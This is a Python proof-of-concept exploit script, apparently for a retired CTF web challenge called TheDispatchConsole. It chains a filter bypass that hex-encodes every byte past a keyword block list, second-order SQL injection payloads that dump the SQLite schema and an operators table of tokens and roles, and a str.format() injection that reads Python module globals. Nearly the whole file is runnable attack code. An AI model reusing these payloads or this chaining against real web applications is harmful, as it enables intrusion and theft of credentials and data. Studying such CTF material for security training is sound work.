#!/usr/bin/env python3
"""
TheDispatchConsole (CSCTF 2026, Web - Medium)

Chains three bugs: a raw-string sanitiser that inspects percent-encoded input
(bypassed by full hex-encoding), a second-order SQL injection in /digest that
interpolates the stored callsign into a query, and a format-string injection
in /report (fmt is passed to str.format()) which reaches module globals.

Raw HTTP via http.client is used so pre-encoded payloads reach the wire
verbatim (requests would re-quote the query string).

Usage: python3 dispatch.py <base_url> <command_token>

The CTF instance is retired; this PoC documents the exploit path.
"""
import sys
import http.client
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
COMMAND_TOKEN = sys.argv[2] if len(sys.argv) > 2 else "<command-token>"

_parsed = urllib.parse.urlparse(BASE)
_host = _parsed.hostname or "<instance>"
_port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
_conn_cls = http.client.HTTPSConnection if _parsed.scheme == "https" else http.client.HTTPConnection


def raw_request(method: str, path: str, body: str = None,
                content_type: str = "application/x-www-form-urlencoded") -> tuple:
    conn = _conn_cls(_host, _port, timeout=15)
    headers = {"Content-Type": content_type} if body is not None else {}
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", errors="replace")
    conn.close()
    return resp.status, data


def hex_encode(s: str) -> str:
    # Hex-encode every byte so the raw request string contains no blocked
    # substring (BLOCKED = ["'", '--', '/*', 'union', 'select']).
    return "".join(f"%{b:02X}" for b in s.encode())


def create_dispatch(callsign: str, body: str) -> tuple:
    raw = f"callsign={hex_encode(callsign)}&body={hex_encode(body)}"
    return raw_request("POST", "/dispatches", raw)


def digest() -> str:
    return raw_request("GET", "/digest")[1]


def main() -> None:
    # Step 1: sanitiser bypass probe (expect 200 instead of 403).
    status, _ = raw_request("GET", f"/dispatches?callsign={hex_encode('--')}")
    print(f"[*] sanitiser probe status: {status}")

    # Step 2: second-order SQLi via /digest. Store hostile callsigns, then
    # read the digest which re-queries with the stored value unescaped.
    create_dispatch("ZZZ' OR '1'='1", "confirm")
    print("[*] ZZZ' OR '1'='1 stored; digest output:\n", digest())

    # Column count via one-column UNION.
    create_dispatch("P4' UNION SELECT 'PWNED4'--", "x")
    digest()

    # Schema dump.
    create_dispatch("Q1' UNION SELECT name FROM sqlite_master--", "x")
    print("[*] sqlite_master names:\n", digest())
    create_dispatch("Q2' UNION SELECT sql FROM sqlite_master--", "x")
    print("[*] sqlite_master schema:\n", digest())

    # Operators table dump (rows surface in the digest under each group).
    create_dispatch("E1' UNION SELECT callsign||' '||token||' '||role FROM operators--", "x")
    print("[*] operators dump:\n", digest())

    # Step 3: /report format-string injection to read module globals (FLAG).
    # Requires the command-role token; supplied via argv.
    fmt = urllib.parse.quote("{dispatch.__class__.__init__.__globals__[FLAG]}", safe="")
    token = urllib.parse.quote(COMMAND_TOKEN, safe="")
    status, body = raw_request("GET", f"/report?token={token}&fmt={fmt}")
    print(f"[*] /report status: {status}\n{body}")


if __name__ == "__main__":
    main()
